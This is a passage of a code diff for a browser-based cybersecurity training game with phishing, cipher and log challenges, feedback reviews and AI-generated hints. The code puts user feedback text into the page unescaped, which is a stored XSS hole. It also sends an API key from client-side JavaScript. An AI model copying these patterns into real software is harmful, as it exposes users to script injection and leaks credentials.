+          <span class="dim">${f.xp} XP · ${new Date(f.created_at).toLocaleDateString()}</span>
+        </div>
+        <div style="font-size:13px;line-height:1.7">${f.text}</div>
+      </div>`).join('');
+
+  return `<div class="main">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px">
+      <div class="h2">💬 PLAYER FEEDBACK</div>
+      <button class="btn-outline" onclick="toggleFeedback()">← BACK</button>
+    </div>
+    ${avgBlock}${formBlock}
+    <div class="h2">▸ RECENT REVIEWS</div>
+    ${reviewList}
+  </div>`;
+}
+
+// ─── TYPEWRITER ───────────────────────────────────────────────────────────────
+function startTyper(text) {
+  if (state.typerTimer) clearInterval(state.typerTimer);
+  state.typerText = ''; state.typerIdx = 0; state.typerDone = false;
+  state.typerTimer = setInterval(() => {
+    if (state.typerIdx >= text.length) {
+      clearInterval(state.typerTimer);
+      state.typerDone = true;
+      render(); return;
+    }
+    state.typerText = text.slice(0, ++state.typerIdx);
+    const el = document.getElementById('typer-out');
+    if (el) el.innerHTML = state.typerText.replace(/\n/g,'<br>') + '<span class="cursor">█</span>';
+  }, 18);
+}
+
+// ─── EVENTS ───────────────────────────────────────────────────────────────────
+function bindEvents() {
+  if (state.screen === 'story' && !state.typerDone) {
+    const chap = GD.chapters[state.chapIdx];
+    const scene = chap.story[state.sceneIdx];
+    startTyper(scene.text);
+  }
+}
+
+window.toggleCodex = () => { state.showCodex = !state.showCodex; state.showFeedback = false; render(); };
+window.toggleFeedback = () => { state.showFeedback = !state.showFeedback; state.showCodex = false; render(); };
+window.goTitle = () => { state.screen = 'title'; render(); };
+
+window.startChap = async (i) => {
+  if (i === 0) {
+    const next = await incrementCount();
+    state.playerCount = next;
+  }
+  state.chapIdx = i; state.sceneIdx = 0; state.chalIdx = 0;
+  state.result = null; state.hint = null; state.foundSpots = new Set();
+  state.selLog = null; state.shift = 0; state.selOpt = null;
+  state.typerDone = false; state.screen = 'story';
+  render();
+};
+
+window.advScene = () => {
+  const chap = GD.chapters[state.chapIdx];
+  if (state.sceneIdx < chap.story.length - 1) {
+    state.sceneIdx++; state.typerDone = false; render();
+  } else {
+    state.chalIdx = 0; state.result = null; state.hint = null;
+    state.foundSpots = new Set(); state.selLog = null; state.shift = 0; state.selOpt = null;
+    state.screen = 'challenge'; render();
+  }
+};
+
+window.selectOpt = (i) => { state.selOpt = i; render(); };
+window.addSpot = (id) => { state.foundSpots.add(id); render(); };
+window.selectLog = (id) => { state.selLog = id; render(); };
+window.setShift = (v) => { state.shift = parseInt(v); render(); };
+window.setRating = (n) => { state.fbRating = n; render(); };
+window.setFbText = (v) => { state.fbText = v; };
+
+window.submitMCQ = () => {
+  const chal = GD.chapters[state.chapIdx].challenges[state.chalIdx];
+  const ok = state.selOpt === chal.correct;
+  if (ok) state.xp += chal.xp;
+  state.result = { ok, expl: chal.explanations[state.selOpt], earned: ok ? chal.xp : 0 };
+  state.screen = 'result'; render();
+};
+
+window.submitEmailSpot = () => {
+  const chal = GD.chapters[state.chapIdx].challenges[state.chalIdx];
+  state.xp += chal.xp;
+  state.result = { ok: true, expl: "Excellent! You identified all 4 phishing indicators like a pro.", earned: chal.xp };
+  state.screen = 'result'; render();
+};
+
+window.submitCaesar = () => {
+  const chal = GD.chapters[state.chapIdx].challenges[state.chalIdx];
+  state.xp += chal.xp;
+  state.result = { ok: true, expl: `✅ The shift was ${chal.shift}. "${chal.answer}" — now you know their plan. Caesar ciphers have only 25 possible shifts, making them trivial to brute-force. Modern encryption uses astronomically larger key spaces.`, earned: chal.xp };
+  state.screen = 'result'; render();
+};
+
+window.submitLog = () => {
+  const chal = GD.chapters[state.chapIdx].challenges[state.chalIdx];
+  const ok = state.selLog === chal.suspiciousId;
+  if (ok) state.xp += chal.xp;
+  state.result = { ok, expl: ok ? chal.explanation : "❌ Not quite. Focus on IP addresses — look for external addresses (not 192.168.x.x) accessing sensitive internal services.", earned: ok ? chal.xp : 0 };
+  state.screen = 'result'; render();
+};
+
+window.nextChal = () => {
+  const chap = GD.chapters[state.chapIdx];
+  if (state.chalIdx < chap.challenges.length - 1) {
+    state.chalIdx++;
+    state.result = null; state.hint = null; state.foundSpots = new Set();
+    state.selLog = null; state.shift = 0; state.selOpt = null;
+    state.screen = 'challenge'; render();
+  } else {
+    const newE = chap.codex.filter(e => !state.codex.find(c => c.term === e.term));
+    state.codex = [...state.codex, ...newE];
+    state.doneChaps = [...state.doneChaps, chap.id];
+    state.screen = 'chap_end'; render();
+  }
+};
+
+window.getHint = async () => {
+  const chal = GD.chapters[state.chapIdx].challenges[state.chalIdx];
+  state.hintLoading = true; render();
+  try {
+    const res = await fetch('https://api.anthropic.com/v1/messages', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'x-api-key': ANTHROPIC_KEY, 'anthropic-version': '2023-06-01', 'anthropic-dangerous-direct-browser-access': 'true' },
+      body: JSON.stringify({ model: 'claude-sonnet-4-6', max_tokens: 200, messages: [{ role: 'user', content: `You are Maya Chen, cybersecurity mentor in a training RPG. A beginner is stuck on: "${chal.title}". Give a helpful, encouraging hint in 2-3 sentences WITHOUT giving away the answer. Be friendly, use simple language. No markdown.` }] })
+    });
+    const d = await res.json();
+    state.hint = d.content?.[0]?.text || 'Keep trying — you can do it!';
+  } catch { state.hint = 'Think carefully about what looks unusual or out of place.'; }
+  state.hintLoading = false; render();
+};
+
+window.submitFeedback = async () => {
+  if (!state.fbRating || !state.fbText.trim() || state.fbLoading) return;
+  state.fbLoading = true; render();
+  const ok = await saveFeedback(state.fbRating, state.fbText.trim(), state.xp);
+  if (ok) {
+    state.fbSubmitted = true;
+    state.feedbacks = await getFeedbacks();
+  }
+  state.fbLoading = false; render();
+};
+
+// ─── INIT ─────────────────────────────────────────────────────────────────────
+(async () => {
+  state.playerCount = await getCount();
+  state.feedbacks = await getFeedbacks();
+  render();
+})();
+</script>
+</body>
+</html>
